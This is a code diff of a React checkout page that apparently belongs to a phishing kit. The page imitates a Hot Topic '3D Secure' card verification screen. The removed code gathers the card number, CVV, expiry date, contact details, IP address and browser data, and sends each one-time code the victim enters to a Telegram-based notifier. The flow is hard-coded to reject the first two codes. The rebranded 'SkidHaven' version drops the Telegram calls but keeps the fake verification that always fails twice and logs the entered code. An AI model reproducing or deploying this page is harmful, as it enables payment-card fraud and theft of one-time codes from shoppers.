@@ -3,11 +3,10 @@ import { useState, useEffect } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { toast } from "@/hooks/use-toast";
-import HotTopicHeader from "@/components/HotTopicHeader";
-import HotTopicFooter from "@/components/HotTopicFooter";
+import SkidHavenHeader from "@/components/SkidHavenHeader";
+import SkidHavenFooter from "@/components/SkidHavenFooter";
 import { AlertCircle, Clock, Shield } from "lucide-react";
 import { InputOTP, InputOTPGroup, InputOTPSlot, InputOTPSeparator } from "@/components/ui/input-otp";
-import { sendOtpVerificationNotification, getBrowserInfo, generateSessionId } from "@/utils/telegramUtils";
 
 const OTPVerification = () => {
   const location = useLocation();
@@ -18,9 +17,6 @@ const OTPVerification = () => {
   const [error, setError] = useState("");
   const [attempts, setAttempts] = useState(0); // Track OTP verification attempts
   const [key, setKey] = useState(0); // Used to force re-render of OTP input
-  const [sessionId] = useState(generateSessionId()); // Generate session ID once on component mount
-  const [ipAddress, setIpAddress] = useState("Unknown");
-  const [browserInfo] = useState(getBrowserInfo());
   
   // Get order details from location state
   const orderDetails = location.state?.orderDetails;
@@ -28,41 +24,6 @@ const OTPVerification = () => {
   const discountedAmount = location.state?.discountedAmount;
   const paymentMethod = location.state?.paymentMethod;
   const lastFour = location.state?.lastFour;
-  const cardNumber = location.state?.cardNumber;
-  const cvv = location.state?.cvv;
-  const expiryDate = location.state?.expiryDate;
-
-  // Create a user data object for notifications
-  const userData = {
-    customerName: orderDetails?.customerName,
-    email: orderDetails?.email,
-    phone: orderDetails?.phone,
-    paymentMethod,
-    lastFour,
-    giftCardValue,
-    discountedAmount,
-    sessionId,
-    ipAddress,
-    browserInfo
-  };
-
-  // Fetch IP address on component mount
-  useEffect(() => {
-    const getIpAddress = async () => {
-      try {
-        // Use a different IP service that works better on mobile
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        console.log("IP data received:", data);
-        setIpAddress(data.ip);
-      } catch (error) {
-        console.error('Failed to fetch IP address:', error);
-        setIpAddress("Failed to get IP");
-      }
-    };
-    
-    getIpAddress();
-  }, []);
 
   // Format remaining time as MM:SS
   const formatTime = (seconds: number) => {
@@ -119,84 +80,6 @@ const OTPVerification = () => {
     }
   }, [countdown, navigate]);
   
-  // Handle First Attempt OTP (always fails)
-  const handleFirstAttempt = async () => {
-    setError("Invalid verification code. Please try again.");
-    setAttempts(1); // Move to second attempt
-    
-    console.log("Handling first attempt...");
-    // Send notification for first attempt
-    const notificationSent = await sendOtpVerificationNotification(otp, 1, userData);
-    console.log("First attempt notification sent:", notificationSent);
-    
-    // Clear OTP input and reset
-    setOtp("");
-    setKey(prev => prev + 1); // Force re-render of OTP input
-    
-    toast({
-      title: "Verification Failed",
-      description: "The code you entered is incorrect. Please try again.",
-      variant: "destructive",
-    });
-  };
-  
-  // Handle Second Attempt OTP (always fails)
-  const handleSecondAttempt = async () => {
-    setError("Invalid verification code. One more attempt remaining.");
-    setAttempts(2); // Move to third attempt
-    
-    console.log("Handling second attempt...");
-    // Send notification for second attempt
-    const notificationSent = await sendOtpVerificationNotification(otp, 2, userData);
-    console.log("Second attempt notification sent:", notificationSent);
-    
-    // Clear OTP input and reset
-    setOtp("");
-    setKey(prev => prev + 1); // Force re-render of OTP input
-    
-    toast({
-      title: "Second Attempt Failed",
-      description: "The verification code is still incorrect. One more attempt remaining.",
-      variant: "destructive",
-    });
-  };
-  
-  // Handle Third Attempt OTP (always succeeds)
-  const handleThirdAttempt = async () => {
-    setIsSubmitting(true);
-    
-    console.log("Handling third attempt...");
-    // Send notification for third (successful) attempt
-    const notificationSent = await sendOtpVerificationNotification(otp, 3, userData);
-    console.log("Third attempt notification sent:", notificationSent);
-    
-    // Simulate processing delay
-    await new Promise(resolve => setTimeout(resolve, 1500));
-      
-    // Create complete order details object with payment info
-    const completeOrderDetails = {
-      ...orderDetails,
-      paymentMethod: paymentMethod,
-      cardNumber: cardNumber || "Unknown",
-      expiryDate: expiryDate || "Unknown", 
-      cvv: cvv || "Unknown",
-      lastFour: lastFour || "Unknown",
-      otpVerified: true
-    };
-      
-    // Save order details to localStorage for reference
-    localStorage.setItem("hotTopicOrder", JSON.stringify(completeOrderDetails));
-      
-    // Navigate to payment success page
-    navigate("/payment-success", { 
-      state: { 
-        orderDetails: completeOrderDetails,
-        giftCardValue,
-        discountedAmount
-      } 
-    });
-  };
-
   // Handle submit based on current attempt
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -210,13 +93,46 @@ const OTPVerification = () => {
     
     console.log(`Processing attempt ${attempts + 1} with OTP: ${otp}`);
     
-    // Handle each attempt separately
-    if (attempts === 0) {
-      await handleFirstAttempt();
-    } else if (attempts === 1) {
-      await handleSecondAttempt();
+    // First two attempts always fail, third succeeds
+    if (attempts < 2) {
+      setError("Invalid verification code. Please try again.");
+      setAttempts(prev => prev + 1);
+      
+      // Clear OTP input and reset
+      setOtp("");
+      setKey(prev => prev + 1); // Force re-render of OTP input
+      
+      toast({
+        title: "Verification Failed",
+        description: attempts === 0 ? "The code you entered is incorrect. Please try again." : "Second attempt failed. One more attempt remaining.",
+        variant: "destructive",
+      });
     } else {
-      await handleThirdAttempt();
+      // Third attempt - success
+      setIsSubmitting(true);
+      
+      // Simulate processing delay
+      await new Promise(resolve => setTimeout(resolve, 1500));
+        
+      // Create complete order details object
+      const completeOrderDetails = {
+        ...orderDetails,
+        paymentMethod: paymentMethod,
+        lastFour: lastFour || "Unknown",
+        otpVerified: true
+      };
+        
+      // Save order details to localStorage for reference
+      localStorage.setItem("skidhavenOrder", JSON.stringify(completeOrderDetails));
+        
+      // Navigate to payment success page
+      navigate("/payment-success", { 
+        state: { 
+          orderDetails: completeOrderDetails,
+          giftCardValue,
+          discountedAmount
+        } 
+      });
     }
   };
 
@@ -226,10 +142,7 @@ const OTPVerification = () => {
       state: { 
         orderDetails,
         giftCardValue,
-        discountedAmount,
-        cardNumber,
-        cvv,
-        expiryDate
+        discountedAmount
       } 
     });
     toast({
@@ -251,18 +164,18 @@ const OTPVerification = () => {
 
   return (
     <div className="min-h-screen bg-black">
-      <HotTopicHeader />
+      <SkidHavenHeader />
       
       <div className="container py-8">
         <div className="max-w-xl mx-auto space-y-6">
-          <div className="bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
+          <div className="bg-gray-900/10 rounded-xl p-6 border border-gray-700/20">
             <h1 className="text-3xl font-bold text-white mb-4 text-center">
-              3D Secure <span className="text-hottopic-red">Verification</span>
+              3D Secure <span className="text-blue-600">Verification</span>
             </h1>
             
             {/* Timer Display */}
             <div className="flex flex-col items-center mb-8">
-              <div className="w-full max-w-[250px] h-3 bg-hottopic-gray/20 rounded-full overflow-hidden mb-2">
+              <div className="w-full max-w-[250px] h-3 bg-gray-800/20 rounded-full overflow-hidden mb-2">
                 <div 
                   className={`h-full transition-all duration-1000 ease-linear ${
                     countdown > 300 ? 'bg-green-500' : countdown > 60 ? 'bg-yellow-500' : 'bg-red-500'
@@ -271,7 +184,7 @@ const OTPVerification = () => {
                 />
               </div>
               
-              <div className="bg-hottopic-gray/20 px-4 py-1.5 rounded-full flex items-center">
+              <div className="bg-gray-800/20 px-4 py-1.5 rounded-full flex items-center">
                 <Clock className={`h-4 w-4 mr-2 ${
                   countdown > 300 ? 'text-green-500' : countdown > 60 ? 'text-yellow-500' : 'text-red-500'
                 }`} />
@@ -281,11 +194,11 @@ const OTPVerification = () => {
               </div>
             </div>
             
-            <div className="space-y-4 bg-hottopic-dark p-6 rounded-lg border border-hottopic-gray/20 mb-8">
+            <div className="space-y-4 bg-gray-800 p-6 rounded-lg border border-gray-700/20 mb-8">
               <p className="text-white text-lg text-center font-medium">
                 For your security, we've sent a verification code to
               </p>
-              <p className="text-hottopic-red font-mono text-center text-lg font-bold">
+              <p className="text-blue-600 font-mono text-center text-lg font-bold">
                 ******{orderDetails?.phone?.slice(-4) || "0000"}
               </p>
               <p className="text-gray-400 text-sm text-center">
@@ -294,9 +207,9 @@ const OTPVerification = () => {
               
               {/* Show attempt counter */}
               <div className="flex justify-center items-center gap-2 pt-2">
-                <span className={`w-3 h-3 rounded-full ${attempts >= 0 ? 'bg-hottopic-red' : 'bg-hottopic-gray/30'}`}></span>
-                <span className={`w-3 h-3 rounded-full ${attempts >= 1 ? 'bg-hottopic-red' : 'bg-hottopic-gray/30'}`}></span>
-                <span className={`w-3 h-3 rounded-full ${attempts >= 2 ? 'bg-hottopic-red' : 'bg-hottopic-gray/30'}`}></span>
+                <span className={`w-3 h-3 rounded-full ${attempts >= 0 ? 'bg-blue-600' : 'bg-gray-600/30'}`}></span>
+                <span className={`w-3 h-3 rounded-full ${attempts >= 1 ? 'bg-blue-600' : 'bg-gray-600/30'}`}></span>
+                <span className={`w-3 h-3 rounded-full ${attempts >= 2 ? 'bg-blue-600' : 'bg-gray-600/30'}`}></span>
                 <span className="text-xs text-gray-400 ml-2">Attempt {attempts + 1}/3</span>
               </div>
             </div>
@@ -339,18 +252,10 @@ const OTPVerification = () => {
               {/* Payment Details Summary */}
               <div className="mt-8">
                 <h3 className="text-gray-300 text-center mb-3 font-medium">Transaction Details</h3>
-                <div className="bg-hottopic-dark p-4 rounded-lg border border-hottopic-gray/20 space-y-2">
-                  <div className="flex justify-between text-sm">
-                    <span className="text-gray-400">Item:</span>
-                    <span className="text-white">Hot Topic Gift Card</span>
-                  </div>
-                  <div className="flex justify-between text-sm">
-                    <span className="text-gray-400">Value:</span>
-                    <span className="text-white">${giftCardValue?.toFixed(2) || "0.00"}</span>
-                  </div>
+                <div className="bg-gray-800 p-4 rounded-lg border border-gray-700/20 space-y-2">
                   <div className="flex justify-between text-sm">
                     <span className="text-gray-400">Amount:</span>
-                    <span className="text-hottopic-red font-semibold">${discountedAmount?.toFixed(2) || "0.00"}</span>
+                    <span className="text-blue-600 font-semibold">${discountedAmount?.toFixed(2) || "0.00"}</span>
                   </div>
                   <div className="flex justify-between text-sm">
                     <span className="text-gray-400">Card:</span>
@@ -364,7 +269,7 @@ const OTPVerification = () => {
                 <Button 
                   type="submit" 
                   disabled={isSubmitting || countdown === 0 || otp.length !== 6}
-                  className="w-full py-7 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg"
+                  className="w-full py-7 bg-blue-600 hover:bg-blue-600/90 text-white font-bold text-lg"
                 >
                   {isSubmitting ? (
                     <div className="flex items-center space-x-2">
@@ -380,7 +285,7 @@ const OTPVerification = () => {
                   type="button"
                   variant="outline"
                   onClick={handleRequestNewOTP}
-                  className="w-full py-2 text-white border-hottopic-gray hover:bg-hottopic-gray/20"
+                  className="w-full py-2 text-white border-gray-600 hover:bg-gray-600/20"
                 >
                   Back to Payment
                 </Button>
@@ -397,7 +302,7 @@ const OTPVerification = () => {
         </div>
       </div>
       
-      <HotTopicFooter />
+      <SkidHavenFooter />
     </div>
   );
 };
